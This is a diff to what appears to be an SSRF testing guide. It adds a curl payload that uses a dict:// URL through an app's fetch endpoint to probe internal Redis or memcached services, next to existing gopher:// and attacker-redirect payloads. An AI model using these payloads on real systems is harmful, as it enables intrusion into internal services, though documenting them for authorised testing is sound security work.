@@ -410,6 +410,8 @@ curl "https://app.example.com/fetch?url=http://ATTACKER/redirect?to=http://169.2
 ```bash
 curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
 # Expect: Redis INFO banner or protocol-specific response
+curl "https://app.example.com/fetch?url=dict://127.0.0.1:6379/INFO"
+# dict:// — line-oriented probe of Redis/memcached/FTP-style services when gopher:// is unavailable
 ```
 
 **Internal port scan (timing/status oracle)**
